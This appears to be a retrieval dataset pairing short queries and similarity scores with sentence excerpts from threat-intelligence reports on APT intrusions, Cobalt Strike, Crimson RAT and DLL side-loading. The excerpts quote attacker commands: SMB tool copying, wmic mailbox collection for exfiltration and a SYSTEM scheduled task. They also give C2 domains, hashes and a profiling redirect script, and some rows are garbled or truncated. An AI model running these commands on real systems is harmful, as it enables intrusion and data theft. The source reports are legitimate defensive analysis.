The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.|1.0|"['The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.', 'Lateral tool transfer (T1570) The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.', 'But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.', 'But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.', 'But first: How did they get the tools on the victims systems?', 'The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.', 'A few examples of commands we observed: 6/22copy get.exe \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\ copy msadc* \\\\\\\\<hostname>\\\\c$\\\\Progra~1\\\\Common~1\\\\System\\\\msadc\\\\ copy update.exe \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\ move ak002.bat \\\\\\\\<ip>\\\\c$\\\\windows\\\\temp\\\\update.bat Collection (TA0009) In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victims network.', 'As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.', 'This document was exfiltrated and used to continue the intrusion via a company portal and VPN.', 'In all cases weve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.', 'But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> process call create ""cmd /c copy c:\\\\Users\\\\<username>\\\\<path>\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\<path>\\\\<username>\\\\My Documents\\\\<filename>.pst"" copy \\\\\\\\<hostname>\\\\c$\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook*.ost Files and folders of interest are collected as well and staged for exfiltration.']"
The DLL’s used were side-loaded in memory on compromised systems.|0.85314821951323|"['This document was exfiltrated and used to continue the intrusion via a company portal and VPN.', 'In all cases weve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.', 'But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems: wmic /node:<ip> process call create ""cmd /c copy c:\\\\Users\\\\<username>\\\\<path>\\\\backup.pst c:\\\\windows\\\\temp\\\\backup.pst"" copy ""i:\\\\<path>\\\\<username>\\\\My Documents\\\\<filename>.pst"" copy \\\\\\\\<hostname>\\\\c$\\\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Outlook*.ost Files and folders of interest are collected as well and staged for exfiltration.', 'The goal of targeting some victims appears to be to obtain Passenger Name Records (PNR).', 'How this PNR data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve PNR data from memory of systems where such data is typically processed, such as flight booking servers.', 'The DLLs used were side-loaded in memory on compromised systems.', 'After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.', 'Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.', 'This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.', 'Weve seen the adversary staging data on a remote system or on the local system.', 'Most of the times the data is compressed and copied at the same time.']"
Use scheduled tasks|0.8037745378109604|['ESET Research white papers TLP: WHITE JUMPING THE AIR GAP: 15 years of nation-state effort Authors: Alexis Dorais-Joncas Facundo Munz December 20212 JUMPING THE AIR GAP: 15 years of nation-state effort TLP: WHITE TABLE OF CONTENTS 1.', 'Executive summary .', '.', '.', '.', '.', '.', '.']
The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.|1.0|"['The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.', 'Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\\\windows\\\\temp\\\\update.bat"" /sc once /f /st 06:59:00 The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.', '4/22Persistence (TA0003) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is rebooted, the beacon is gone.', 'The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.']"
"An example of the creation of such a scheduled task by the adversary:
schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\windows\temp\update.bat"" /sc once /f /st 06:59:00"|0.8287197196778859|"['Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\\\windows\\\\temp\\\\update.bat"" /sc once /f /st 06:59:00 The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.', '4/22Persistence (TA0003) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is rebooted, the beacon is gone.', 'The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.', 'We havent seen the adversary use those access methods after the first Cobalt Strike beacons were installed.']"
batch files for automation.|0.7538012821906938|['In summary: The adversary: Working hours match with GMT+8.', 'Infrastructure: appspot.com and azureedge.net for C2 with a strong overlap in naming convention for subdomains and actual overlap in some subdomains between intrusions.', 'Capability: Password spraying/credential stuffing.', 'Cobalt Strike.', 'Copy NTDS.dit.', 'Use scheduled tasks and batch files for automation.', 'The use of LOLBins.', 'WinRAR.', 'Cloud exfil tool and exfil to OneDrive.', 'Erasing Windows Event Logs, files and tasks.', 'Overlap in filenames for tools, staged data, and folders.']
executing a batch-file (.bat) to perform their tasks.|0.7595091300889875|"['The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.', 'Because of this, historic information was available during this investigation.', 'Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.', 'If a match was found, the configuration of the Cobalt Strike team server was analysed.', 'This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.', 'The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.', 'An example of the creation of such a scheduled task by the adversary: schtasks /create /ru ""SYSTEM"" /tn ""update"" /tr ""cmd /c c:\\\\windows\\\\temp\\\\update.bat"" /sc once /f /st 06:59:00 The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.', '4/22Persistence (TA0003) The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.', 'Once the system is rebooted, the beacon is gone.', 'The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.', 'Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.']"
The adversary installs a hackers best friend during the intrusion: Cobalt Strike.|0.8694541552116211|['A tool used by the adversary which wasnt installed on the servers by default, was DSInternals.', 'DSInternals is a PowerShell module that makes use of internal Active Directory features.', 'The files and directories found on various systems of a victim match with DSInternals version 2.16.1.', 'We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.', 'We havent recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.', 'Execution (TA0002) The adversary installs a hackers best friend during the intrusion: Cobalt Strike.', 'Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.', 'It has been widely adopted by malicious threats as well.', 'The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.', 'At least the following three versions of Cobalt Strike have been in use by the adversary: Cobalt Strike v3.8, observed Q2 2017 Cobalt Strike v3.12, observed Q3 2018 Cobalt Strike v3.14, observed Q2 2019 Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.', 'This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog Identifying Cobalt Strike team servers in the wild.']
Malicious documents that implement this technique require users to double-click a document element.|1.0|['The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding.', 'The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.', 'The macros create and decompress an embedded archive file in the 1/4%ALLUSERSPROFILE% directory (C:\\\\ProgramData) and execute the Crimson RAT payload within.', 'Some macros insert text in the document, which is typically education-themed content relating to India.', 'Macro implementation Macro-inserted document text In addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT.', 'Malicious documents that implement this technique require users to double-click a document element.', 'The documents distributed by Transparent Tribe typically display an image (a View Document graphic) indicating that the document content is locked.', 'This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe).', 'The View Document graphic 2/4OLE stream that stores Crimson RAT Transparent Tribe is known to experiment with different malware staging techniques, which include distributing executables with embedded documents or documents that execute designated Crimson RAT loaders.', 'The adoption of OLE embedding further highlights the groups continuous experimentation with malware staging techniques.', 'Crimson RAT Implementations We observed a variety of Crimson RAT .NET implementations, with compilation timestamps between July and September 2022.']
Malicious documents that implement this technique require users to double-click a document element.|1.0|['Further,drive-phone[.', ']onlineclosely resembles thephone-drive[.', ']onlinedomain recentlyobservedhosting Transparent Tribe malware targeting Indian and Pakistani Android users.The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding.The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.', 'The macros create and decompress an embedded archive file in the%ALLUSERSPROFILE%directory (C:\\\\ProgramData) and execute the Crimson RAT payload within.', 'Some macros insert text in the document, which is typically education-themed content relating to India.Macro implementationMacro-inserted document textIn addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT.', 'Malicious documents that implement this technique require users to double-click a document element.', 'The documents distributed by Transparent Tribe typically display an image (a View Document graphic) indicating that the document content is locked.', 'This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe).The View Document graphicOLE stream that stores Crimson RATTransparent Tribe is known to experiment with different malware staging techniques, which include distributingexecutableswith embedded documents or documents thatexecutedesignated Crimson RAT loaders.', 'The adoption of OLE embedding further highlights the groups continuous experimentation with malware staging techniques.Crimson RAT ImplementationsWe observed a variety of Crimson RAT.NETimplementations, with compilation timestamps between July and September 2022.', 'The Crimson RAT payloads we analyzed use thericha-sharma.ddns[.', ']netdomain for C2 purposes and support either 40 or 65 commands, most of which have been documented inpreviousresearch.']
implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.|0.9294450236614387|['This aligns with a documented Crimson RAT variant with the identifier S.L.2.2., which has used the sunnyleone.hopto[.', ']org domain for C2 purposes.', 'As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds.', 'Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run only if the victims machine name differs.', 'G551JW or 3/4DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions.', 'Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.', 'We observed the use of the Eazfuscator obfuscator in a Crimson RAT sample named NewOrleans.', 'Evidence suggests that the Crimson RAT developers have patched the routine that evaluates the trial period of Eazfuscator to enable the execution of the malware after the trial period expires.', 'Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry message With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the addition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT.', 'Conclusion Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbook, and targets.', 'Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embedding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations.']
obfuscated using Crypto Obfuscator,|0.770279242414033|"['Macro code: Workbook Open Figure 8.', 'Macro code: Main function which is called inside Workbook Open event XOR Key : ""MxjnbvbX%$#@c%%!', '@#$C%^&* (K(*&K0^%$W$@!&@#$C%EGGGxcel^MicrosoLKHGFD^%$W@2017!&^%$#lx^&%$0"" 5/10Figure 9.', 'Macro code: XOR function msword.exe is an SFX archive executable, which contains multiple malicious executable files as shown in Figure 10.', 'Figure 10. msword.exe contents File name File info 3_5 LimeRAT [Runtime: .Net Framework 2.0] 4 AsyncRAT [Runtime: .Net Framework 4] 4_5 AsyncRAT [Runtime: .Net Framework 4.5] 4_5_1 AsyncRAT [Runtime: .Net Framework 4.5.1] 4_5_2 AsyncRAT [Runtime: .Net Framework 4.5.2] 4_6 AsyncRAT [Runtime: .Net Framework 4.6] 4_6_1 AsyncRAT [Runtime: .Net Framework 4.6.1] 4_7 AsyncRAT [Runtime: .Net Framework 4.7 4_7_2 AsyncRAT [Runtime: .Net Framework 4.7.2] igfx.exe Delphi compiled file installs RAT file according to available .Net version Upon execution, ""msword.exe"" drops the RAT files shown in the table above.', 'These RAT executables are obfuscated using Crypto Obfuscator For .Net.', 'msword.exe then starts the process igfx.exe which performs the following actions: Checks the .NET version in the registry; based on the installed version, renames the compatible RAT file to excel.exe Checks the registry keys to determine the .NET version in the order listed below.', 'If found, a version of the runtime file (AsyncRAT) is picked corresponding to the .NET version.', 'If none of the registry keys are found, the file 3_5 (LimeRAT) is used.', 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5.1 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.5.2 6/10HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.6 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.6.1 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.7 HKLM\\\\SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4.7.2 Sets the file attributes of excel.exe to hidden and read-only.', 'Adds a Run registry entry for persistence.']"
DLL Side-Loading|1.0000000000000002|['We also found some known malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.', 'Below we describe the loading, persistence, and features of the two backdoors.', 'Type 1 Backdoor Loading the Payload This backdoor is written in the C++ language with classes that inherit from virtual classes.', 'The backdoor is also modular, allowing for expansion with the use of plugins.', 'Current Method: DLL Side-Loading To load this backdoor, the threat actor launches the legitimate file MsMpEng.exe, which is signed by Microsoft and described as an Antimalware Service Executable.', 'This executable is vulnerable to DLL side-loading,3 wherein an unintended DLL is loaded on a program.', 'In this case, the malicious actor takes advantage of it by storing a file named mpsvc.dll in the same directory.', 'That DLL then opens a third filename, mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into a svchost.exe process.', 'We found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing the aforementioned files.', 'The modification time of the embedded files is 2019-07-25.', 'Old Method: Patching of a Legitimate File Interestingly, we observed a different technique being used in an older version of this backdoor.']
DLL Side-Loading|0.7710437972117202|['PlugX is a modular structured malware that has many different operational plugins such as communication compression and encryption, network enumeration, files interaction, remote shell operations and more.', 'The samples we analyzed originated from the Philippines.', 'APT10 frequently targets the Southeast Asia region.', 'In this article we examine both versions of the loader along with their payloads, TTPs and Command and Control (C&C) server information.', 'https://blog.ensilo.com/uncovering-new-activity-by-apt10 1/115/28/2019 Uncovering New Activity By APT10 Loader Abusing a Legitimate Executable The loader starts out by running a legitimate executable which is abused to load a malicious DLL instead of a legitimate one which it is depended on.', 'The method is known as DLL Side-Loading.', 'In both variants, the abused executable is jjs.exe which loads jli.dll.', 'The DLL exports the following functions: JLI_CmdToArgs JLI_GetStdArgs JLI_GetStdArgc JLI_MemAlloc JLI_Launch The first function called by jjs.exe is JLI_CmdToArgs which is implemented by the malware author and behaves differently in each variant.', 'Running The Payload The malicious DLL maps the data file, svchost.bin, to memory and decrypt it.', 'The decrypted content is a shellcode that is injected into svchost.exe and contains the actual malicious payload.', 'The decryption process resembles previous versions used by the group in PlugX\\\\RedLeaves.']
DLL Side-Loading|1.0000000000000002|"['No further content was served from lite.php during the investigation.', 'A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document.', 'This could have been intended as an exploitation of something like CVE-2016-0034 which is known to have been adopted by exploit kits back in February 2016 and which pre-dates MONSOON.', ""HTTP/1.1 200 OK Date: Fri, 27 May 2016 22:32:29 GMT Server: Apache X-Powered-By: PHP/5.5.12 Content-Length: 749 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html <script>function hasSilverlightPlugin() { var slplugin = false; var browser = navigator.appName; // Get the browser type if (browser == 'Microsoft Internet Explorer') { try { var slControl = new ActiveXObject('AgControl.AgControl'); if (slControl) { slplugin = true; } } catch (e) { } } else { // Netscape, FireFox, Google chrome etc try { if (navigator.plugins['Silverlight Plug-In']) { slplugin = true; } } catch (e) { } } return slplugin; } var javascriptVariable = hasSilverlightPlugin(); window.location.href = 'lite.php?name='+javascriptVariable; </script> Figure 19 Silverlight Profiling MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 21/57Forcepoint Security Labs | Special Investigations BADNEWS MALWARE The BADNEWS malware is capable of arbitrary command execution, screenshots, self-updating, downloading and executing files, and directory listings."", 'The name was given due to its use of RSS feeds, forums, blogs and Dynamic DNS providers for its C&C infrastructure.', 'BADNEWS uses a DLL side-loading technique with a signed Java binary in order to evade security solutions.', 'It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour.', 'DLL Side-Loading.', 'The BADNEWS DLL is typically side-loaded into a legitimate signed Java executable.', ""A specific weaponised document analysed10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll MicroScMgmt.exe is a renamed version of the legitimate Java Runtime's 6.0.390.4 binary named java- rmi.exe and is signed by Sun Microsystems."", 'This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll.']"
DLL Side-Loading|1.0000000000000002|"[']ua"", ,    .', ', , 08.11.2022  .', 'RAR- ""shahed-136.rar"",  PPSX- ""shahed.ppsx"", ,  , VBScript-,   ,  ,   PowerShell-.', ',    RC4,   ,    ""Manager""  ("" |shahed.ppsx"").', 'PowerShell-  BitsTransfer (Background Intelligent Transfer Management)   ""WibuCm32.dll"", ""CodeMeter.exe"" ( ),    .', ',  DLL Side-Loading.', '""WibuCm32.dll""   DolphinCape,    Delphi     (\' , \' , , ,  ), EXE/DLL ,   ,    .', 'UAC-0140.', ': 247997c2b4431585f9355d3324410298 460244cbf353b15b52c69952dd3b2549de79c590c56807bc25d4896dd0016655 shahed- 136.rar 241e4285a84be65cf16778462f06b9a8 5137a888271b08f388d863433e5f0f1b129e15d4c812b95c831e93e27ec45bd6 1/3shahed.ppsx 3444e86aefa7bc2dbce34903f805400d 6ee62645cd97fb0b41fdf219b9a2a8211324ded110b5c7f09b3d9881abb2a594 SearchEmbdIndex.ps1 142893c48b76b7e9d0f7ce74e16aaf1f 2c1a2fe3fb418601f3adc9256e1ff2c509178483fdbb0e964f52fb6b30be1129 CodeMeter.exe 98c3d5347842743bfb4ade50b39226c1 772654b186ad9fbd0a80f03ceae7d327b45c8944452cc39048160b1f6d8f2672 WibuCm32.dll (2022-09-24 06:09:32) (DolphinCape) : morgunov.a@dsns.com.ua 195[.', ']123.237.147 202[.', ']157.187.190 Mozilla/3.0 (compatible; Indy Library) dsns.com[.']"
DLL Side-Loading|0.898567946224601|['13Operation Dream Magic         .', '()     TLP: RED  .', '()   () TLP: AM BER .', ',              , ,  TLP: G REEN    ,    TLP: WHITE   ,   2  []      .', ',     .', '.', ',       .', '.', '2Operation Dream Magic  1.', '..................................................................................................................................................................................................... 4 2.', '.............................................................................................................................................................. 4 (1)  ........................................................................................................................................................................... 5 (2)  ......................................................................................................................................................................... 15 3.']
DLL Side-Loading|0.7550288776907068|[]
DLL Side-Loading|0.7931591747881945|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
obfuscated with SmartAssembly|0.8344904670398646|['IcedID HTTP POST request with encoded victim information.', '(Source: Secureworks) 2022 State of the Threat: A Year in Review 20 01 Letter From Our CTIO Executive Summary 02 and Key Findings Ransomware Remains the 03 Primary Strategic Threat Ransomware Enablers: 04 Loaders and Infostealers Exploitation of Remote 05 Services is Now the Most Common Access Vector Hostile Government- 06 Sponsored Actor Activity Shows a Regional Focus 06 Defense Evasion Offers Its 07 Own Detection Opportunities 07 08 Conclusion 08 The Secureworks Figure 12.', 'Taegis XDR detection for IcedID malware.', '(Source: Secureworks) 09 View of the Threat 2022 State of the Threat: A Year in Review 21New on the Scene PureCrypter 01 Letter From Our CTIO PureCrypter is a fully featured malware builder and loader advertised There have been a number of new loaders that have emerged during for sale since March 2021 at $59 USD for one month and $249 for Executive Summary the reporting period, and in some cases disappeared again.', 'CTU 02 and Key Findings lifetime use.', 'It is a .NET executable obfuscated with SmartAssembly.', 'researchers assess that the groups operating these loaders may move It is widely used to drop payloads for cybercriminal ends.', 'In addition, away from the complex, fully-featured botnets that evolved from the CTU researchers assess with moderate confidence that the developers early banking trojans towards more lightweight loaders that are easier Ransomware Remains the 03 Primary Strategic Threat to develop and maintain.', 'That shift is likely enabled by increased use of the WhisperGate32 file wiper that was deployed against targets in Ukraine prior to the Russian invasion used PureCrypter to generate the of fully featured and actively maintained post-exploitation tools such .NET code in both the loader and the initial payload.', 'as Cobalt Strike.', 'The role of the loader is simply to achieve an initial Ransomware Enablers: 04 access point, perhaps perform some basic reconnaissance such as Loaders and Infostealers checking that the infected host is joined to an Active Directory domain, and then retrieve and execute the post-exploitation tool.']
API calls|0.777082605926789|['While the zonal cluster is patched, the Kubernetes API cannot be used, as the APIs manager (the control plane) is unavailable.', 'Regional clusters, in contrast, have control plane redundancy of threeand when they are patched, one control plane will be unavailable, while the others will be available.', 'The available control planes will, among other functionality, keep the Kubernetes API operating.', '18Threat Horizons For more information, visit gcat.google.com The low hanging fruit: leaked service account keys and the impact to your organization Leaked, or inadvertently shared, service account Attackers Shifting Tactics credentials continue to be one of the leading factors of abuse on Google Cloud.', 'The Cloud Security to Conceal API Calls Alliances (CSA) 2022 Top Threats to Cloud Computing Our teams fighting fraud and abuse on the platform - Pandemic Eleven report identified Insufficient have observed attackers continually changing their Identity, Credentials, Access, and Key Management as defense evasion techniques to conceal the origin of the #1 security issue facing cloud customers.', 'In 42% of API calls.', 'Attackers have attempted to use Tor nodes, leaked key incidents detected by our abuse systems, open proxies, other compromised cloud instances, customers did not take action after Google attempted and even other cloud service providers.', 'Oftentimes to contact the project owner, so the key remained attackers dont know what IAM permissions or vulnerable to abuse.', 'While there are many instances resources are associated with a service account and of new accounts or developers testing code exposing instead try to maximize fraudulent profits by utilizing service account keys, our teams have observed automation tools to spin up cloud resources such as compromises distributed across varying sizes and high cpu instances as quickly as possible and across maturities of organizations.', 'Organizations seeking to several Google Cloud zones before theyre detected reduce and mitigate the risk must take into account and instances shutdown.', 'However, depending on key management, principle of least privilege with the IAM permissions granted, an attacker that has scoped IAM policies, policies and controls to prevent discovered a service account key could cause more keys from leaking, as well as continually scanning and detrimental harm to customers.']
the API calls|0.7650161079191694|['While the zonal cluster is patched, the Kubernetes API cannot be used, as the APIs manager (the control plane) is unavailable.', 'Regional clusters, in contrast, have control plane redundancy of threeand when they are patched, one control plane will be unavailable, while the others will be available.', 'The available control planes will, among other functionality, keep the Kubernetes API operating.', '18Threat Horizons For more information, visit gcat.google.com The low hanging fruit: leaked service account keys and the impact to your organization Leaked, or inadvertently shared, service account Attackers Shifting Tactics credentials continue to be one of the leading factors of abuse on Google Cloud.', 'The Cloud Security to Conceal API Calls Alliances (CSA) 2022 Top Threats to Cloud Computing Our teams fighting fraud and abuse on the platform - Pandemic Eleven report identified Insufficient have observed attackers continually changing their Identity, Credentials, Access, and Key Management as defense evasion techniques to conceal the origin of the #1 security issue facing cloud customers.', 'In 42% of API calls.', 'Attackers have attempted to use Tor nodes, leaked key incidents detected by our abuse systems, open proxies, other compromised cloud instances, customers did not take action after Google attempted and even other cloud service providers.', 'Oftentimes to contact the project owner, so the key remained attackers dont know what IAM permissions or vulnerable to abuse.', 'While there are many instances resources are associated with a service account and of new accounts or developers testing code exposing instead try to maximize fraudulent profits by utilizing service account keys, our teams have observed automation tools to spin up cloud resources such as compromises distributed across varying sizes and high cpu instances as quickly as possible and across maturities of organizations.', 'Organizations seeking to several Google Cloud zones before theyre detected reduce and mitigate the risk must take into account and instances shutdown.', 'However, depending on key management, principle of least privilege with the IAM permissions granted, an attacker that has scoped IAM policies, policies and controls to prevent discovered a service account key could cause more keys from leaking, as well as continually scanning and detrimental harm to customers.']
“Who and What Threatens the World (Column).exe” and is designed to deceive users by using an icon that is similar to that of Hancom Office.|0.9277452958080764|['AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.', 'The malware that is being distributed is named Who and What Threatens the World (Column).exe and is designed to deceive users by using an icon that is similar to that of Hancom Office.', 'Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes.AhnLab Endpoint Detection and Response (EDR) is capable of detecting such attack techniques through its trace data, and it allows users to check the data required to investigate the related breach case.Figure 1 depicts the icon of the malware and its overall execution.', 'It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.']
creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.|0.9403742789572248|['AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.', 'The malware that is being distributed is named Who and What Threatens the World (Column).exe and is designed to deceive users by using an icon that is similar to that of Hancom Office.', 'Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes.AhnLab Endpoint Detection and Response (EDR) is capable of detecting such attack techniques through its trace data, and it allows users to check the data required to investigate the related breach case.Figure 1 depicts the icon of the malware and its overall execution.', 'It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.']
malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.|0.9065680900131385|['AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.', 'The malware that is being distributed is named Who and What Threatens the World (Column).exe and is designed to deceive users by using an icon that is similar to that of Hancom Office.', 'Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes.AhnLab Endpoint Detection and Response (EDR) is capable of detecting such attack techniques through its trace data, and it allows users to check the data required to investigate the related breach case.Figure 1 depicts the icon of the malware and its overall execution.', 'It provides a visual representation of which processes are used when the malware is executed.Figures 2 and 3 show the trace data of key behaviors within the overall flow of the malware.', 'In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.', 'In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.', 'The malware is injected and executed within the normal Windows process called mstsc.exe.', 'The original file is deleted using the cmd command.Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.', 'The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.', 'Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.', 'The URL registered in the task scheduler appears to be a normal homepage, but it contains a web 